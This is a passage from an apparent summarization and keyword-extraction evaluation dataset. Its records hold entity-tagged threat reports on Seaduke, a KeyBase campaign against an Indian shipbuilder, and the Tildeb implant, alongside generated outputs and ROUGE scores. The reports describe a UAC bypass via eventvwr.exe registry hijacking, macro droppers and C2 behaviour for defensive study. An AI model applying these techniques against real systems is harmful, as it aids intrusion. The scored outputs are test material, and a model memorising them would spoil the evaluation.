etc. Technical analysis shows it exfiltrates sensitive data like SMS, contacts, call logs, files, images, location, and can record audio and take photos. The malware communicates with a hardcoded command and control server to receive commands. It can steal data, record audio/video, and more based on commands received. The blog identifies a fake website seemingly used to distribute the malware disguised as the real app. It highlights the serious threat posed by such spyware targeting the Indian military and provides recommendations on how to prevent, identify, and respond to such malware. In summary, the post analyzes an Android spyware masquerading as an official Indian Army app to compromise devices of military personnel and exfiltrate sensitive data. It provides technical details on the malware's capabilities and operation. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.524390243902439, "gpt3/lexical/rouge_rouge2": 0.20245398773006137, "gpt3/lexical/rouge_rougeL": 0.2682926829268293, "gpt3/lexical/rouge_rougeLsum": 0.2682926829268293, "gpt3_generated_text": ["The article discusses an Android malware that specifically targets Indian Army personnel by pretending to be the legitimate ARMAAN application. The attackers have customized the app and added malicious code to it, allowing the malware to perform remote access Trojan (RAT) activities. Once executed, the malicious app can steal sensitive data such as contacts, call logs, SMSes, location, and files from the victim's device. The malware requests the user for various permissions, abusing ten of them to gain access to the user's SMSes, call logs, contacts, and location. The malware also communicates with a command and control (C&C) server to send collected information. The article provides technical analysis and insights into the malware's source code and communication methods. It emphasizes the importance of user awareness and effective security measures to prevent such attacks."]}, {"split_name": "val", "sample_id": "val_62", "prompt_text": "Extract the keywords: \" Forkmeiamfamous \" : Seaduke , latest weapon in the Duke armory Low - profile information - stealing [ORG] Trojan is used only against high- value targets . Symantec has uncovered an elusive [GPE] Trojan used by the cyberespionage group behind the \u00e2\u20ac\u0153Duke\u00e2\u20ac   family of malware . Seaduke ( detected by [NORP] Symantec as [GPE] Trojan . Seaduke ) is a low - profile information- stealing [GPE] Trojan which appears to be reserved for attacks against a small number of high - value targets . [ORG] Seaduke has been used in attacks against a number of major , government - level targets . The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and exfiltrating sensitive information such as email from the victim\u00e2\u20ac \u2122 s computer . [ORG] Seaduke has a highly configurable framework and [ORG] Symantec has already found [CARDINAL] hundreds of different configurations on compromised networks . Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high - level government targets . While the [ORG] Duke group began to distribute Cozyduke in an increasingly aggressive manner , [ORG] Seaduke installations were reserved only for select targets . Seaduke victims are generally [ORDINAL] first infected with [ORG] Cozyduke and , if the computer appears to be a target of interest , the operators will install [ORG] Seaduke . Background The group behind [ORG] Seaduke is a cyberespionage operation that is responsible for a series of attacks against high - profile individuals and organizations in government , international policy and private research in [GPE] the [GPE] United [GPE] States and [LOC] Europe . It has a range of malware tools at its disposal , known as the Dukes , including [ORG] Cozyduke ( [ORG] Trojan . Cozer ) , Miniduke ( Backdoor . Miniduke ) and [PERSON] Cosmicduke ( Backdoor . Tinybaron).News of the [ORG] Duke group [ORDINAL] first emerged in [DATE] March and [DATE] April [DATE] of [DATE] 2015 , when reports detailing attacks involving a sophisticated threat actor variously called [ORG] Office [ORG] Monkeys , [GPE] EuroAPT , [PERSON] Cozy [PERSON] Bear , and Cozyduke were published . Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010 . The group began its current campaign as early as [DATE] March [DATE] 2014 , when [GPE] Trojan . Cozer ( aka Cozyduke ) was identified on the network of a private research institute in [GPE] Washington , [GPE] D.C. In [DATE] the [DATE] months that followed , the [ORG] Duke group began to target victims with \u00e2\u20ac\u0153Office Monkeys\u00e2\u20ac - and \u00e2\u20ac\u0153eFax\u00e2\u20ac -themed emails , booby - trapped with a [ORG] Cozyduke payload . These tactics were atypical of a cyberespionage group . It\u00e2\u20ac \u2122 s quite likely these themes were deliberately chosen to act as a smokescreen , hiding the true intent of the adversary . Figure [CARDINAL] 1 . Cozyduke campaign used an \u00e2\u20ac\u0153Office Monkeys\u00e2\u20ac   video as a lure\u00e2\u20ac\u201cJuly 2014 The [ORG] Duke group has mounted an extended campaign targeting high - profile networks over extended periods , something which is far beyond the reach of the majority of threat actors . Its capabilities include : Attack infrastructure leveraging [CARDINAL] hundreds of compromised websites [PERSON] Rapidly developed malware frameworks in concurrent use Sophisticated operators with fine - tuned computer network exploitation ( CNE ) skillsAlthough Cozyduke activity was [ORDINAL] first identified in [DATE] March [DATE] 2014 , it wasn\u00e2\u20ac \u2122 t until [DATE] July that the group managed to successfully compromise high - profile government networks . Cozyduke was used throughout these attacks to harvest and exfiltrate sensitive information to the attackers . In parallel , the [ORG] Duke group was also installing separate malware onto these networks , namely [ORG] Backdoor . Miniduke and the more elusive [GPE] Trojan . Seaduke . It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms . The Miniduke payload In [DATE] July [DATE] of [DATE] 2014 , the group instructed [ORG] Cozyduke - infected computers to install [ORG] Backdoor . Miniduke onto a compromised network . Miniduke has been the group\u00e2\u20ac \u2122 s tool of choice for [DATE] a [DATE] number [DATE] of [DATE] years in espionage operations predominantly targeting government and diplomatic entities in [LOC] Eastern [LOC] Europe and ex - Soviet states . \u00e2\u20ac\u0153Nemesis Gemina\u00e2\u20ac   appears to be the internal name for the framework used by the group to identify the project , previously reported by [PERSON] Kaspersky . The following debug string was present in the sample used in these attacks : C:\\Projects\\nemesis - gemina\\nemesis\\bin\\carriers\\ezlzma_x86_exe.pdbThis project name has been seen in [ORG] Backdoor . Tinybaron ( aka Cosmicduke ) samples , which [ORG] Symantec also attributes to the [ORG] Duke group . This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks . The [ORG] Seaduke payload These attacks were already well underway when another group began to deploy a previously unknown piece of malware . In [DATE] October [DATE] 2014 , the [ORG] Seaduke payload began to appear within target networks . Although [ORG] Seaduke was developed in Python , the overall framework bears a striking resemblance to Cozyduke in terms of operation . It\u00e2\u20ac \u2122 s unclear why the attackers waited until [DATE] October to deploy [ORG] Seaduke . Was it reserved for a more specific attack ? Was part of their cover blown , necessitating the use of an alternative framework ? The [ORG] Seaduke framework was designed to be highly configurable . [CARDINAL] Hundreds of reconfigurations were identified on compromised networks . The communication protocol employed had many layers of encryption and obfuscation , using [CARDINAL] over [CARDINAL] 200 compromised web servers for command and control . [ORG] Seaduke required a significant investment of time and resources in the preparatory and operational phases of the The attackers control Cozyduke via compromised websites , issuing instructions to infected machines by uploading \u00e2\u20ac\u0153tasks\u00e2\u20ac   to a database file . Cozyduke will periodically contact these websites to retrieve task information to be executed on the local machine . [CARDINAL] One such task ( an encoded [ORG] PowerShell script ) instructed Cozyduke to download and execute [ORG] Seaduke from a compromised website . Figure [CARDINAL] 2 . How the attacker tasks Cozer to install [ORG] Seaduke [ORG] Seaduke operation The attackers can operate [ORG] Seaduke in a broadly similar fashion to Cozyduke . The [ORG] Seaduke control infrastructure is essentially distinct , opening up the possibility of sub - teams concurrently exploiting thetarget network . [ORG] Unlike [ORG] Cozyduke , [ORG] Seaduke operators upload \u00e2\u20ac\u0153task\u00e2\u20ac   files directly to the command- and - control ( [ORG] C&C ) server ; there is no database as such present . [ORG] Seaduke securely communicates with the [ORG] C&C server over [ORG] HTTP / HTTPS beneath layers of encoding ( [PERSON] Base64 ) and encryption ( RC4 , AES ) . To an untrained eye , the communications look fairly benign , no doubt an effort to stay under the radar on compromised networks . Figure [CARDINAL] 3 . How [ORG] Seaduke operates on the target network [ORG] Seaduke has many inbuilt commands which are available to the attackers . They have the ability to retrieve detailed bot / system information , update bot configuration , upload files , download files , and self- delete the malware from the system . The self - delete function is interestingly called \u00e2\u20ac\u0153seppuku\u00e2\u20ac . This is a form of [NORP] Japanese ritual suicide . Seaduke payloads The attackers have also developed a number of additional payloads . Operators can push these payloads onto infected machines for very specific attacks . Impersonation using [PERSON] Kerberos pass - the - ticket attacks ( [PERSON] Mimikatz [PERSON] PowerShell ) Email extraction from [ORG] the [ORG] MS [ORG] Exchange [ORG] Server using compromised credentials Archiving sensitive information Data exfiltration via legitimate cloud services [PERSON] Secure file deletionWhat next ? The [ORG] Duke group has brought its operational capability to the next level . Its attacks have been so bold and aggressive , that a huge amount of attention has been drawn to it , yet it appears to be unperturbed . Its success at compromising such high - profile targets has no doubt added a few feathers to its cap . Even the developers reveled in this fact , naming one of Seaduke\u00e2\u20ac \u2122 s functions [PERSON] \u00e2\u20ac\u0153forkmeiamfamous\u00e2\u20ac . While the group is currently keeping a lower profile , there\u00e2\u20ac \u2122 s no doubt it will reappear . Some tools may have to be abandoned , some reworked and others built completely from scratch . This attack group is in it for the long haul .", "generated_text": "Symantec; a low-profile information-stealing Trojan; the Duke; malware; attacks; a small number; high-value targets; the malware; encrypted emails; sensitive information; the victim; the attackers; Cozyduke; Miniduke; Backdoor Miniduke; Tinybaron; the attackers; infrastructure; hundreds; compromised websites; capabilities; multiple payloads; the group; the threat actor; governmental organizations; European; 2014; governments; at least 2010; attacks; a variety; its capabilities; the group; domains; campaigns; id; domains; domain names; attacks; a high-profile name; the Duke group; attacks.", "ref_text": "<START-1>Symantec analyzed a sophisticated malware called Seaduke used in targeted cyberespionage attacks. Seaduke is part of the \"Duke\" family of malware tools used by an advanced threat actor. Other tools include CozyDuke and MiniDuke. The group has been active since at least 2010, targeting government and diplomatic entities. Seaduke is reserved for high-value targets and used alongside CozyDuke for stealthy data exfiltration. The malware uses multiple layers of encryption and obfuscation to avoid detection. It has highly configurable capabilities. CozyDuke can install Seaduke via commands from the attacker's infrastructure. Seaduke C2 is separate. Seaduke features include system reconnaissance, file operations, self-deletion, and specialized payloads. The report speculates on the group's future plans to rework tools and infrastructure to continue long-term cyberespionage campaigns. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4965034965034965, "gpt3/lexical/rouge_rouge2": 0.18309859154929575, "gpt3/lexical/rouge_rougeL": 0.24475524475524477, "gpt3/lexical/rouge_rougeLsum": 0.24475524475524477, "gpt3_generated_text": ["Symantec has uncovered a low-profile information-stealing Trojan called Seaduke, which is part of the Duke family of malware. This Trojan is used by a cyberespionage group to target a small number of high-value targets, such as major government-level organizations. Seaduke is capable of quietly stealing and exfiltrating sensitive information, such as encrypted emails, from the victim's computer. The group behind Seaduke, known as the Duke group, has a range of malware tools at its disposal, including Cozyduke, Miniduke, and Cosmicduke. The group has a history of compromising governmental and diplomatic organizations since at least 2010. They have a sophisticated attack infrastructure, using hundreds of compromised websites, and rapidly developed malware frameworks in concurrent use. They have fine-tuned computer network exploitation skills and are capable of mounting extended campaigns targeting high-profile networks over extended periods. The Duke group uses multiple payloads, including Cozyduke and Miniduke, to exploit networks and provide additional persistence mechanisms."]}, {"split_name": "val", "sample_id": "val_63", "prompt_text": "Extract the keywords: [CARDINAL] 2/28/2017Cyber [ORG] Attack [ORG] Targeting [ORG] Indian [ORG] Navy 's Submarine and Warship Manufacturer - Cysinfo\uf3abCYBER ATTACK TARGETING INDIAN [ORG] NAVY \u2019S SUBMARINE AND [PERSON] WARSHIP MANUFACTURER3 WEEKS AGO \u2022 ARTICLES \u202221\uf34dIn my previous blog posts I described attack campaigns targeting [NORP] Indian government organizations , and [ORG] Indian [ORG] Embassies [ORG] andMinistry [ORG] of [ORG] External a airs . In this blog post I describe a new attack campaign where cyber espionage group targeted the users [ORG] ofMazagon [ORG] Dock [ORG] Shipbuilders [ORG] Limited ( also called as ship builder to the nation ) . Mazagon Dock Shipbuilders Limited ( [ORG] MDL ) is [ORG] aPublic [ORG] Sector [ORG] Undertaking [ORG] of [ORG] Government [ORG] of [GPE] India ( [ORG] Ministry [ORG] of [ORG] Defence ) and it specializes in manufacturing warships and submarinesfor [ORG] the [ORG] Indian [ORG] Navy . In order to infect the users associated with Mazagon Dock Shipbuilders Limited ( [ORG] MDL ) , the attackers distributed spear - phishingemails containing malicious excel   le which when opened drops a malware capable of spying on infected systems . The emailpurported to have been sent from legitimate email ids . The attackers spoofed the email i d associated with a [GPE] Spain based equipmentmanufacturing company Hidrofersa which specializes in designing , manufacturing naval , industrial and mining machinery . Overview of the Malicious EmailsOn 26th [DATE] January , [CARDINAL] 2017 [ORG] Indian [ORG] Navy displayed its state - of - the - art stealth guided missile destroyer [ORG] INS [ORG] Chennai and the indigenously - made [ORG] Kalvari class [ORG] Scorpene submarines at the Republic Day parade showcasing [GPE] India \u2019s military strength and achievements . [ORG] INSChennai and [PERSON] Kalvari class submarines were manufactured by Mazagon Dock Shipbuilders Limited ( MDL).On 25th January ( day before the Republic day ) attackers spoofed an email i d associated with Hidrofersa a [GPE] Spain based companywhich specializes in designing , manufacturing naval , industrial and mining machinery and the email was sent to the users [ORG] ofMazagon [ORG] Dock [ORG] Shipbuilders [ORG] Limited ( [ORG] MDL ) . The email attachment contained [CARDINAL] two malicious excel   les ( both excel   les turned out tobe same but used di erent names ) . The email was made to look like it was sent by a General service manager of [GPE] Hidrofersaenquiring about the product delivery schedule . Below screen shot shows the recipients associated with Mazagon Dock Shipbuilders Limited ( [ORG] MDL ) , this information was determinedfrom the Email header . Mazagon Dock Shipbuilders Limited ( [ORG] MDL ) is listed as [CARDINAL] one of clients of [ORG] Hidrofersa ( mentioned in [GPE] Hidrofersa website ) and as per theirwebsite Hidrofersa has shipped equipments to Mazagon Dock Shipbuilders Limited ( [ORG] MDL ) in the past as shown in the below screenshots . This is probably the reason attackers spoofed the email i d of Hidrofersa as it is less likely to trigger any suspicion and there isurl [ORG] Attack [ORG] Targeting [ORG] Indian [ORG] Navy 's Submarine and Warship Manufacturer - Cysinfohigh chance of recipients opening the attachment as it is coming from a trusted equipment manufacturer ( Hidrofersa ) . It looks like \uf3abattackers carefully researched ( or they already knew about ) the trust relationship between these [CARDINAL] two companies . From the email it looks like the goal of the attackers was to infect , take control of the systems of users associated with [ORG] MazagonDock [ORG] Shipbuilders [ORG] Limited ( [ORG] MDL ) and to steal sensitive information ( like Product design documents , blueprints , manufacturingprocesses etc ) related to warships and submarines . Analysis of Malicious Excel FileWhen the recipient of the email opens the attached excel   le it prompts the user to enable macro content and the excel alsocontains instruction on how to enable the macros . Once the the macro content is enabled , it calls an auto execute function [PERSON] Workbook_Open ( ) which in turn downloads the malwaresample and executes on the system . The malicious macro code was reverse engineered to understand its capabilities . The macrocode was heavily obfuscated ( used obscure variable / function names to make analysis harder ) as shown below.url [ORG] Attack [ORG] Targeting [ORG] Indian [ORG] Navy 's Submarine and Warship Manufacturer - CysinfoThe macro also contained lot of junk code , unnecessary comments and variable assignments as shown below . The attackers probably compromised the university website to host the malware . The technique of hosting malicious code in a university site ( legitimate site ) has advantages and it is unlikely to trigger any suspicion in security monitoring and also can bypass reputation based devices . The [ORG] PowerShell script ( shown below ) drops the downloaded executable in the % TEMP% directory as \u201c doc6.exe \u201c . It then adds a registry entry for the dropped executable and invokes eventvwr.exe , this is an interesting registry hijack technique which allows the doc6.exe to be executed by eventvwr.exe with high integrity level and also this technique silently bypasses the [ORG] UAC ( user account control ) . This technique of [ORG] UAC bypass is mentioned in the blog \u201c Fileless \u201d [ORG] UAC [ORG] Bypass [ORG] Using eventvwr.exe and [ORG] Registry [ORG] Hijacking . Normally when eventvwr.exe process ( which is running as high integrity process ) is invoked , it starts mmc.exe which opens eventvwr.msc causing [ORG] the [ORG] Event [ORG] Viewer to be displayed . To start mmc.exe , eventvwr.exe searches this registry key . The dropped \u00d2le ( doc6.exe ) was determined as [PRODUCT] KeyBase malware . This malware can steal and send sensitive information to the attackers like keystrokes , opened applications , web browsing history , usernames / passwords , upload [ORG] Desktop screen shots etc . The feature of uploading the [ORG] Desktop screen shot is notable because if the infected user opens a design or design document related to submarines or warships the screen shot of that can be sent to the attacker . The attackers also hosted multiple samples of [PRODUCT] KeyBase malware in the compromised university website . Below screen shot shows hashes of [CARDINAL] 25 samples hosted on the university site . Analysis of the Dropped Executable ( doc6.exe ) The dropped \u00d2le was analyzed in an isolated environment ( without actually allowing it to connect to the c2 server ) . This section contains the behavioral analysis of the dropped executable . Once the dropped \u00d2le ( doc6.exe ) is executed the malware copies itself into % AllUsersPro\u00d2le% directory as \u201c [ORG] Important.exe \u201d , In addition to that it also drops [CARDINAL] two \u00d2les \u201c Mails.txt \u201d and \u201c [ORG] Browsers.txt \u201d into the same directory as shown below . The malware then creates a registry value for the the dropped \u00d2le ( [ORG] Important.exe ) , this ensures that malware is executed every time the system restarts . The malware after execution keeps track of the user activity ( like applications opened , [PERSON] \u00d2les opened etc ) but does not immediately generate any network tra\u00d5c , this is to make sure that no network activity is generated during automated / sandbox analysis . After sleeping for a long time malware makes an http connection to the [CARDINAL] C2 server ( command & control server ) and sends the tracked user activity to the attacker . The below screen shot shows the communication to the [CARDINAL] C2 server on port [CARDINAL] 80 . Once malware makes an http connection after sleeping for a long time , it sends the system information and the tracked activity to the [CARDINAL] C2 server as http parameters . Below screen shot shows the network communication pattern where the hostname and the machine time is sent to C2 server . Below screen shot shows a network communication pattern where the opened window title was sent to the [CARDINAL] C2 server , this pattern below indicates that \u201c test.txt \u201d \u00d2le was opened with notepad on the infected system . Below screen shot shows a network communication pattern indicating a document named \u201c secret.docx \u201d was opened with [ORG] Microsoft [ORG] Word . Threat Intelligence Even though attackers tried to make it look like the spear phishing email was sent by an email i d associated with Hidrofersa but inspecting the email headers revealed some interesting information . Based on the information mentioned above , It looks like the spoofed email was sent by a user associated with a [GPE] Pakistan based company [PERSON] Combined [PERSON] Freight ( PVT ) Limited . Indicators Of Compromise In this case the cyber espionage group targeted Mazagon Dock Shipbuilders Limited ( [ORG] MDL ) but it is possible that other defense equipment manufacturers could also be targeted as part of this attack campaign . The indicators associated with this attack are provided so that the organizations ( Government , Public , Private organizations , [ORG] Defense and Defense equipment manufacturers ) can use these indicators to detect , remediate and investigate this attack campaign . Below are the indicators .", "generated_text": "cyber espionage; a public sector undertaking; Ministry of Defence; the Indian Navy; spear-phishing emails; Excel; a malware; spying; the infected systems; the email; Hidrofersa; the malware; the user; The email; technology; the attachment; the malware; data; a sample; the user; the malware; the user; the Indian Navy; a trusted equipment manufacturer; these two companies; the goal; control; the systems; the attackers; the use; products; naval; industrial; mining; The malware; the users.", "ref_text": "<START-1>The PDF describes a cyberattack campaign targeting Mazagon Dock Shipbuilders Limited (MDL), an Indian company that manufactures submarines and warships for the Indian Navy. - On January 25, 2017, the day before India's Republic Day celebrations, attackers sent spear-phishing emails pretending to be from a Spanish naval equipment company called Hidrofersa. The emails contained malicious Excel files that installed a malware called KeyBase if macros were enabled. The attackers researched the trust relationship between MDL and Hidrofersa, a equipment manufacturer, to increase the chances of recipients opening the attachment. - KeyBase is a spyware that can steal sensitive information like keystrokes, screenshots, browser history etc and send it back to the attackers. The timing of the attack suggests the attackers wanted to steal sensitive design information about MDL's submarines and warships. - The malware communicated with a command and control server at the domain tripleshop[.]id hosted on a server in Indonesia. The attackers used obfuscated macro code and downloaded malware from a compromised university site in Indonesia to carry out the attack. - Analysis of the email headers suggests the attack may have originated from a Pakistan-based freight company called Combined Freight. Previous campaigns have also targeted Indian government organizations and embassies. - The attack shows hallmarks of a state-sponsored campaign to steal intellectual property and gain military advantages. The malware was designed to be stealthy and evade detection. Cyber espionage groups continue to target defense industries and manufacturers to steal proprietary information. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4907651715039578, "gpt3/lexical/rouge_rouge2": 0.15915119363395225, "gpt3/lexical/rouge_rougeL": 0.29023746701846964, "gpt3/lexical/rouge_rougeLsum": 0.29023746701846964, "gpt3_generated_text": ["A recent cyber attack targeted Mazagon Dock Shipbuilders Limited (MDL), a public sector undertaking of the Indian Ministry of Defence that specializes in manufacturing warships and submarines for the Indian Navy. The attackers distributed spear-phishing emails containing malicious Excel files to infect the users associated with MDL. The emails were spoofed to appear as if they were sent from a trusted equipment manufacturer called Hidrofersa in Spain. The goal of the attackers was to infect and take control of the systems of MDL users in order to steal sensitive information related to warships and submarines. The malicious Excel files contained macro code that, when enabled, downloaded and executed the malware on the system. The attackers used a university website to host the malware, which allowed them to bypass security monitoring and reputation-based devices."]}, {"split_name": "val", "sample_id": "val_64", "prompt_text": "Extract the keywords: File and [PERSON] Code [PERSON] Characteristics The implant has the following file characteristics:\uf0b7 [PERSON] File name : clocksvc.exe [CARDINAL] \uf0b7 Compiled as 32 - Bit \u2013 Console Windows executable [CARDINAL] \uf0b7 [PRODUCT] Accepts command - line arguments [CARDINAL] \uf0b7 Compilation timestamp : [DATE] October [DATE] 3 , [DATE] 2000 \u2013 21:01:55 [CARDINAL] \uf0b7 File size : [DATE] 57344 bytesIt has been [DATE] 18 [DATE] years since the implant was compiled , but it \u2019s possible that it may have been created earlier considering the time it took to develop and the number of iterations it might have gone through . Although we can not say that the compilation timestamp is accurate , it is unlikely to be a forged value considering the environment it targets and the compiler version used . Moreover , the implant is developed using the C language , with the [NORP] C++ part restricted to [ORG] the [ORG] Windows [ORG] Foundation Class ( MFC ) library , that is , mfc42.dll . The [ORG] MFC library is primarily used for network communications and compiled using Microsoft Visual C++ v6.0.Tildeb \u2019s code is not obfuscated in any way and thus has no anti - disassembly and anti - debugging features , encrypted strings , or similar obfuscation techniques . [ORG] Infection [ORG] Vector and Relation to Other Files Since Tildeb is positioned as a stand - alone implant , we could n\u2019t link it to any other files from the leak even while searching for various artifacts from the implant . However , a search by filename in the rest of the leak \u2019s dump shows the table \u201c ProcessInformation \u201d in the database file , [GPE] \\windows\\Resources\\Ops\\Databases\\SimpleProcesses.db , with the following : NameCommentclocksvc.exe * * * PATROLWAGON * * * Type SAFEIt is likely that \u201c PATROLWAGON \u201d is a moniker for an unknown exploitation framework or some other tool that works in conjunction with Tildeb that is yet to be discovered . The DB Table \u201c ProcessInformation \u201d contains a variety of legitimate and known process names and different types . \u201c Type \u201d takes either of the following values : [GPE] NONE , MALICIOUS_SOFTWARE , SECURITY_PRODUCT , CORE_OS , ADMIN_TOOL , and SAFE . Of interest is the SAFE type , which shows process names that map to known exploitation frameworks and tools such as [ORG] UNITEDRAKE , [ORG] MOSSFERN , [ORG] EXPANDINGPULLY , [ORG] GROK , [ORG] FOGGYBOTTOM , [ORG] MORBIDANGEL , and others . It is unknown how Tildeb gets delivered onto a targeted system , but it would not be surprising if it \u2019s delivered via lateral movement or through some of the other exploitation frameworks that have RCE modules targeting [ORG] Windows [ORG] NT.1Command [ORG] Line [ORG] Options [ORG] Tildeb is a console - based executable that can take command - line arguments . Since it does n\u2019t use [ORG] MFC \u2019s WinMain function , it instead calls AfxWinInit directly to initialize [ORG] MFC upon execution . It successfully terminates itself if it fails . The implant can take argument [DATE] 0 , [CARDINAL] 1 , [DATE] 2 , [DATE] 3 , or [CARDINAL] 4 ( excluding argv[0 ] ) at once . Each serves a specific purpose:\uf0b7 Case \u2013 0 : If executed without any arguments , it uses the hardcoded IP address137[.]140[.]55[.]211 and port [CARDINAL] 25 to communicate with its [ORG] C&C server.\uf0b7 Case \u2013 [CARDINAL] 1 : It expects an [ORG] IP / domain address to connect to as the [ORG] C&C server . \uf0b7 Case \u2013 [CARDINAL] 2 : The [ORDINAL] first argument is the same as in case \u2013 [CARDINAL] 1 . The [ORDINAL] second argument is the port numberto connect over.\uf0b7 Case \u2013 [CARDINAL] 3 : The [ORDINAL] first [CARDINAL] two arguments are the same as in case \u2013 [CARDINAL] 2 . The [ORDINAL] third argument is the port ituses for creating a Transmission Control Protocol ( TCP ) socket in listening mode for accepting an ingress connection in case the egress connection fails ( cases : [CARDINAL] 0 , [CARDINAL] 1 , [CARDINAL] 2 ) . The default listening port is hardcoded to 1608.\uf0b7 Case \u2013 4 : The [ORDINAL] first [CARDINAL] three arguments are the same as in case \u2013 [CARDINAL] 3 . The [ORDINAL] fourth argument takes the value -ju that sets a global variable to [CARDINAL] 1 . This instructs the implant to attempt elevating privileges in order to inject code into a [ORG] Microsoft [ORG] Exchange [ORG] Server process . [PERSON] Cleanup [PERSON] Thread and [ORG] Main [ORG] Process [ORG] Cleanup [ORG] Code After checking for any command line arguments , [ORG] Tildeb will sleep for [TIME] 4.096 [TIME] seconds . This is followed by setting a global variable , which we \u2019ve referred to as up_time , with the current time since the Epoch ( in seconds).It then initializes and sets [CARDINAL] two [ORG] Security [ORG] Descriptors discretionary access control lists ( DACL ) to [ORG] NULL , which allows access to [CARDINAL] two objects . [CARDINAL] One is a mailslot it creates under the name [GPE] \\\\.\\mailslot\\c54321 . The handle of this object is set as such so it is not inheritable by a new process . Another is a temporary file it creates on the system under the name tmp < uuuu>.tmp . The handle of this object is set as such so it is inheritable by a new process . It subsequently attempts to initialize [PRODUCT] Windows [PRODUCT] Sockets and terminates itself if it fails to do so . Otherwise , it continues to create a global mutex object under the name [FAC] nowMutex . The mutex is not created for ensuring [CARDINAL] only [CARDINAL] one instance of itself is running . In fact , there may be [CARDINAL] more [CARDINAL] than [CARDINAL] one instance running at the same time . The mutex is created solely for thread synchronization , that is , for signaling to the cleanup thread to acquire it . A mutex is a mutually exclusive object , and [CARDINAL] only [CARDINAL] one thread can own it at a time . Tildeb has a fail - aware thread responsible for housecleaning upon failure in specific operations in the code throughout the program lifetime . We \u2019ve referred to this thread as the cleanup_thread . The synchronization between the main process thread and the cleanup_thread happens as follows . Initially , the main process thread is the owner of the mutex object [ORG] nowMutex , which is in a non - signaled state at this point . At the same time , the cleanup_thread waits to acquire it indefinitely . For cleanup_thread to acquire the mutex , the owning thread releases it via the [ORG] ReleaseMutex ( ) application programming interface ( API ) . When this happens , the mutex object becomes signaled and the cleanup_thread may acquire it.2The release of the mutex object and the trigger of the cleanup process carried out by the cleanup_thread happen when Tildeb:\uf0b7 Fails to receive data from the [ORG] C&C server ( if the number of bytes received is [CARDINAL] 0 ) . \uf0b7 Fails to create a process / execute a file ( control command [CARDINAL] 0x20 ) . [CARDINAL] \uf0b7 Successfully acquires the mutex object ( if it is signaled by other thread ) ; this is control command - dependent . When the cleanup_thread is created , it [ORDINAL] first attempts to set the thread \u2019s priority to run only when the system is idle using the API SetPriorityClass(hThread , IDLE_PRIORITY_CLASS ) . However , the usage of this API in the context of the thread is not correct , as this pertains to process priority and not threads . The proper API would have been SetThreadPriority ( hThread , THREAD_PRIORITY_IDLE ) . Therefore , the thread priority level will be that of the process thread priority , which is THREAD_PRIORITY_NORMAL . This mistake is present in every thread created by the implant . After setting the thread 's priority , it goes into a while loop where the conditional exit is controlled via a global flag setting , which we \u2019ve referred to as wayout_flag ( initially this flag is set to [CARDINAL] 0 ) . Inside the loop , it sleeps for [TIME] 15 [TIME] seconds on every iteration . To exit the while loop:\uf0b7 The state of the mutex object must be anything other than signaled . [CARDINAL] \uf0b7 [TIME] More [TIME] than [TIME] 15 [TIME] minutes had passed since the implant has started ( this is also dependent on theup_time value).Once outside the while loop , it checks again if [TIME] less [TIME] than [TIME] 15 [TIME] minutes have passed . If so , it terminates the cleanup thread . Otherwise , it proceeds to close available handles , delete a temp file , shut down and close sockets , and terminate the process , as shown in Figure [CARDINAL] 1.Accordingly , the cleanup thread functions as a watchdog . If nothing happens that would influence its behavior in [TIME] less [TIME] than [TIME] 15 [TIME] minutes , the implant cleans after itself and is terminated . The main process thread signals the cleanup thread via the pseudocode ( shown in Figure [CARDINAL] 2 ) , which also alters the process main thread \u2019s continuous operation . The process thread [ORDINAL] first attempts to acquire the mutex and sets the wayout_flag flag if it is in a non - signaled state . Otherwise , it updates the up_time variable value with the current time , releases the mutex ( thus becoming signaled for the cleanup thread to acquire it if possible ) , and then checks if the number of bytes received from the server is [CARDINAL] 0 . If so , it sets the wayout_flag flag . As shown in Figure [CARDINAL] 2 , the main process thread also goes through a similar cleanup procedure when it fails to receive data from the server by setting the wayout_flag flag , causing it to terminate itself . Note that Tildeb is not equipped with any persistence mechanism . It is unlikely that one will be created considering what the cleanup code does.3 { if ( [ORG] WaitForSingleObject(h_nowMutex , [DATE] 10s ) ) { elapsed_time = ( current_time ( ) - up_time ) ; if ( elapsed_time > = [CARDINAL] 15 m ) { if ( elapsed_time < [CARDINAL] 15 m ) { ms_exc.registration . [ORG] TryLevel = [CARDINAL] 0 ; shutdown(notcreated_socket , SD_BOTH ) ; CSocket::Close(&CSocket_success ) ; return 0;Figure [CARDINAL] 1 : cleanup_thread pseudocode { if ( WaitForSingleObject(h_nowMutex,10s ) ) { bytes_read = recv_from_server(&rec_data ) ; send_data_to_server(&ss , aOk , [CARDINAL] 3 u , 0 ) ; sleep(3s ) ; shutdown(notcreated_socket , [CARDINAL] 2 ) ; CSocket::Close(&ss ) ; return x;Figure [CARDINAL] 2 : [ORG] Main process cleanup and threadsynchronization pseudocodeNetwork Communications All of the network sockets created to communicate with the [ORG] C&C server is carried over the [ORG] TCP protocol . Tildeb may establish either an ingress or egress connection with the server depending on which connection is established successfully . It uses [LAW] the [LAW] MFC [LAW] Classes [LAW] CAsyncSocket and [ORG] CSocket for all network communications . [ORDINAL] First , it creates a TCP SOCK_STREAM with the list of events \u201c [ORG] FD_CLOSE | FD_CONNECT | FD_ACCEPT | FD_OOB | FD_WRITE | FD_READ \u201d . However , there 's nothing in the code that checks for these events . Without checking whether the socket is successfully created or not , it attempts to connect to it using the hardcoded [ORG] IP address [CARDINAL] 137[.]140[.]55[.]211 over the default port number [CARDINAL] 25 . It \u2019s worth noting that despite the port number assignment , the implant does not communicate over [ORG] the [ORG] Simple [ORG] Mail [ORG] Transfer [ORG] Protocol ( [PERSON] SMTP).If the connection is successful , it proceeds to set the priority class of the process to NORMAL_PRIORITY_CLASS ( no scheduling requirements ) . It then attempts to disable the Nagle4algorithm for send coalescing using the option TCP_NODELAY for a non - created socket . Additionally , this same , non - existent socket is referenced [CARDINAL] three more times in the code ( all designed to shut it down , making it likely that it 's leftover code ) . It then sends the check - in message Success\\x00 to the server then creates the cleanup_thread thread . If it fails to connect to the socket , it closes it and creates the cleanup_thread thread . It then creates another socket with similar attributes , but for accepting ingress 